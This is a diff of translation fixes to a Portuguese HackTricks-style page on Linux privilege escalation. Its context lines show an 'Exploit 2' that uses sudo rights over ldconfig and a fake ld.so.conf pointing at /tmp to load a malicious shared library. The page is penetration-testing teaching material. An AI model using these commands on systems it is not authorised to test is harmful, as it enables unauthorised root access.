@@ -24,7 +24,7 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 {% endhint %}
 {% endhint %}
 
-## Prepare o ambiente
+## Prepare the environment
 
 Na seção a seguir, você pode encontrar o código dos arquivos que vamos usar para preparar o ambiente
 
@@ -132,7 +132,7 @@ Mas existem outras má configurações que podem causar a mesma vulnerabilidade;
 
 ## Exploit 2
 
-**Suponha que você tenha privilégios de sudo sobre `ldconfig`**.\
+**Suponha que você tenha privilégios sudo sobre `ldconfig`**.\
 Você pode indicar ao `ldconfig` **onde carregar os arquivos de configuração**, então podemos aproveitar isso para fazer o `ldconfig` carregar pastas arbitrárias.\
 Então, vamos criar os arquivos e pastas necessários para carregar "/tmp":
 ```bash
@@ -140,7 +140,7 @@ cd /tmp
 echo "include /tmp/conf/*" > fake.ld.so.conf
 echo "/tmp" > conf/evil.conf
 ```
-Agora, como indicado no **exploit anterior**, **crie a biblioteca maliciosa dentro de `/tmp`**.\
+Agora, como indicado na **exploração anterior**, **crie a biblioteca maliciosa dentro de `/tmp`**.\
 E finalmente, vamos carregar o caminho e verificar de onde o binário está carregando a biblioteca:
 ```bash
 ldconfig -f fake.ld.so.conf
@@ -164,7 +164,7 @@ Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data
 
 * Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
 * **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
+* **Compartilhe truques de hacking enviando PRs para os repositórios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 {% endhint %}
